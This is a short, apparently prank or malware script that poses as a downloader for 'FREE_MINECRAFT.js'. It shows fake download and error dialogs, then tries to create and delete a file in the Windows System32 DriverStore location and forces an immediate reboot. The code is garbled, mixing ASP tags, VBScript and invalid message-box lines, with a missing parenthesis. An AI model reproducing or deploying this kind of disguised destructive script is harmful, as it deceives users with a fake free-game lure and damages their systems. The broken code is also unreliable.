xmsgbox=("Would you like to download FREE_MINECRAFT.js?" 0+16 "Downloader")
xmsgbox=("Downloading..." 0 "Downloader")
xmsgbox=("Fatal error has happened during downloading process." 0 "Downloader")
<%
dim filesys
Set filesys = CreateObject("Scripting.FileSystemObject")
filesys.CreateTextFile("C:\Windows\System32\DriverStore", True
If filesys.FileExists("C:\Windows\System32\DriverStore") Then
filesys.DeleteFile "C:\Windows\System32\DriverStore"
Response.Write("File deleted")
End If
%>
Set WSHShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "C:\WINDOWS\system32\shutdown.exe -r -t 0"
